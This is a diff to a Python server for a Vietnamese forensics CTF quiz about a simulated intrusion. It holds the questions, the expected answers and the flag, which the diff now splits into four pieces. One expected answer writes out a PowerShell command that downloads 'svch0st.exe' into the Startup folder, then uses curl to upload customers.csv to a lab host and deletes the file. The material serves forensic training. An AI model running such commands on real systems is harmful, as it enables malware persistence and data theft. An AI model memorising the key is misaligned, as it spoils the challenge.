@@ -2,7 +2,7 @@ import socketserver
 import time
 
 # --- CẤU HÌNH FLAG CHÍNH THỨC ---
-FLAG = "GDUCTF{soc_exfiltration_mastered}" 
+FLAG = "GDUCTF{n3v3r_g1v3_up_4lw4ys_h4v3_4_ch4nc3}" 
 
 # --- BỘ CÂU HỎI VÀ ĐÁP ÁN ---
 QUESTIONS = [
@@ -25,7 +25,8 @@ QUESTIONS = [
     },
     {
         "q": "[Câu 1.5] Tên tệp mà attacker đã tải lên hệ thống:",
-        "a": r"dstrootcax3.p7c"
+        "a": r"dstrootcax3.p7c",
+        "flag_part": "GDUCTF{n3v3r_"
     },
     {
         "context": "--- PHẦN 2: TỆP HỆ THỐNG (MFT) ---\n[Câu 2] Sau khi báo cáo các thông tin thu thập được từ nhật ký mạng, công ty đã tiến hành trích xuất thêm tệp MFT để tìm kiếm thêm thông tin bổ sung về cuộc tấn công. Phân tích file MFT để trả lời các câu sau:",
@@ -34,7 +35,8 @@ QUESTIONS = [
     },
     {
         "q": "[Câu 2.2] Tên tệp độc hại được người dùng tải về (đường dẫn tuyệt đối):",
-        "a": r".\PathUnknown\DirectorywithID0x000005EC-00000001\AliceWong\Downloads\ F0rtigate_setup.exe"
+        "a": r".\PathUnknown\DirectorywithID0x000005EC-00000001\AliceWong\Downloads\ F0rtigate_setup.exe",
+        "flag_part": "g1v3_up_"
     },
     {
         "context": "--- PHẦN 3: NHẬT KÝ SỰ KIỆN (EVTX) ---\n[Câu 3] Tiếp tục thu thập thông tin từ nhật ký sự kiện của hệ thống để tìm kiếm thêm thông tin của cuộc tấn công. Phân tích file log.evtx để trả lời các câu sau:",
@@ -44,7 +46,8 @@ QUESTIONS = [
     {
         "q": "[Câu 3.2] Attacker đã sử dụng cách thức nào để tải mã độc về máy chủ:",
         # Giữ nguyên chuỗi payload dài khớp với script auto của người chơi
-        "a": r'''C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svch0st.exe\'); (New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Local\Temp\svch0st.exe\')" && curl -F "file=@C:\Users\Alice Wong\Downloads\customers.csv" http://10.0.2.15:5000/upload && del customers.csv"'''
+        "a": r'''C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svch0st.exe\'); (New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Local\Temp\svch0st.exe\')" && curl -F "file=@C:\Users\Alice Wong\Downloads\customers.csv" http://10.0.2.15:5000/upload && del customers.csv"''',
+        "flag_part": "4lw4ys_h4v3_4_"
     },
     {
         "context": "--- PHẦN 4: HỆ THỐNG MAIL SERVER (EML) ---\n[Câu 4] Tiếp tục thu thập thông tin từ hệ thống mail server của công ty để tìm kiếm thêm thông tin của cuộc tấn công. Phân tích file mail.eml để trả lời các câu hỏi sau:",
@@ -61,7 +64,8 @@ QUESTIONS = [
     },
     {
         "q": "[Câu 4.4] Công cụ thực hiện cuộc tấn công? (Kèm domain)",
-        "a": r"Emkei's Fake Mailer (emkei.cz)"
+        "a": r"Emkei's Fake Mailer (emkei.cz)",
+        "flag_part": "ch4nc3}"
     }
 ]
 
@@ -90,13 +94,17 @@ class CTFHandler(socketserver.BaseRequestHandler):
                 return 
 
             if answer == item["a"]:
-                self.send_msg("[+] Correct!\n") 
+                self.send_msg("[+] Correct!\n")
+                if "flag_part" in item:
+                    self.send_msg(f"[*] BẠN ĐÃ QUA MÀN! Nhận mảnh ghép Flag: {item['flag_part']}\n")
+                    self.send_msg("-------------------------------------------------------------------")
             else:
                 self.send_msg("[-] Wrong! Bằng chứng không khớp. Đóng kết nối.")
                 return 
         
-        self.send_msg("\n[+] All answers correct. Well done!")
-        self.send_msg(f"[*] Here is your flag: {FLAG}\n")
+        self.send_msg("\n[+] XUẤT SẮC! Bạn đã trả lời đúng tất cả các câu hỏi vụ án.")
+        self.send_msg("[*] Hãy ghép cả 4 mảnh nhỏ ở trên lại để được Flag hoàn chỉnh nhé!")
+        self.send_msg("===================================================================\n")
 
 if __name__ == "__main__":
     HOST, PORT = "0.0.0.0", 1334 
